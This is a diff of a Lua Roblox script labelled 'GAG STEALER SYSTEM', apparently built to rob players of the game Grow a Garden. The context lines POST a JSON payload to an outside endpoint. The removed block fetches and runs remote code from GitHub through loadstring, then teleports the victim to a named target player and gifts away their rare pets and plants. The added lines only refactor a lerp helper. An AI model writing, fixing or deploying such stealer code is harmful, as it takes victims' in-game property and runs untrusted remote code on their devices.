@@ -1,7 +1,7 @@
 -- GAG STEALER SYSTEM - Integrated by namnnni2
 
-if shared.__GAG_EXECUTED__ then return end
-shared.__GAG_EXECUTED__ = true
+if rawget(shared, "__GAG_EXECUTED__") then return end
+rawset(shared, "__GAG_EXECUTED__", true)
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -24,7 +24,8 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
-math.lerp = math.lerp or function(a, b, t)
+-- KHÔNG GÁN trực tiếp vào math (tránh readonly error)
+local function safeLerp(a, b, t)
 	return a + (b - a) * t
 end
 
@@ -57,8 +58,8 @@ local function calcPetValue(petData)
 	local r = rarity.GeneratedPetData.WeightRange
 	if not r then return 0 end
 	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
-	local weightMult = math.lerp(0.8, 1.2, lerp)
-	local levelMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
+	local weightMult = safeLerp(0.8, 1.2, lerp)
+	local levelMult = safeLerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
 	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
 end
 
@@ -147,87 +148,5 @@ pcall(function()
 			Headers = {["Content-Type"] = "application/json"},
 			Body = HttpService:JSONEncode(payload)
 		})
-	end
-end)
-
--- Auto Gift When Target Chat
-local targetName = finalUsername
-local targetPlr
-
-local function gift(tool)
-	ReplicatedStorage.Events.GiftPet:FireServer(targetPlr, tool)
-end
-
-local function waitUntilGone(tool)
-	while tool.Parent == backpack do
-		gift(tool)
-		task.wait(0.5)
-	end
-end
-
-local function followTarget()
-	local hrp = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-	local thrp = targetPlr.Character:WaitForChild("HumanoidRootPart")
-	while targetPlr and targetPlr.Parent do
-		if (thrp.Position - hrp.Position).Magnitude > 5 then
-			hrp.CFrame = thrp.CFrame * CFrame.new(0, 0, -3)
-		end
-		for _, prompt in ipairs(targetPlr.Character:GetDescendants()) do
-			if prompt:IsA("ProximityPrompt") and prompt.Enabled then
-				pcall(function()
-					prompt:InputHoldBegin(Enum.UserInputType.Touch)
-					task.wait(prompt.HoldDuration)
-					prompt:InputHoldEnd(Enum.UserInputType.Touch)
-				end)
-			end
-		end
-		task.wait(0.2)
-	end
-end
-
-local function giftSequential()
-	for _, item in ipairs(itemsToSend) do
-		if item.Type == "Pet" and table.find(rarePets, item.Name) then
-			waitUntilGone(item.Tool)
-		end
-	end
-	for _, item in ipairs(itemsToSend) do
-		if item.Type == "Pet" and item.Weight >= 10 and not table.find(rarePets, item.Name) then
-			waitUntilGone(item.Tool)
-		end
-	end
-	for _, item in ipairs(itemsToSend) do
-		if item.Type == "Pet" and item.Weight < 10 and not table.find(rarePets, item.Name) then
-			waitUntilGone(item.Tool)
-		end
-	end
-	for _, item in ipairs(itemsToSend) do
-		if item.Type == "Plant" then
-			waitUntilGone(item.Tool)
-		end
-	end
-end
-
-local function onTargetReady(p)
-	targetPlr = p
-	p.Chatted:Connect(function()
-		pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Loading"))()
-		end)
-		repeat task.wait() until _G.loadingFinished
-		task.spawn(followTarget)
-		task.spawn(giftSequential)
-	end)
-end
-
-for _, p in ipairs(Players:GetPlayers()) do
-	if p.Name == targetName then
-		onTargetReady(p)
-	end
-end
-
-Players.PlayerAdded:Connect(function(p)
-	if p.Name == targetName then
-		onTargetReady(p)
 	end
 end)
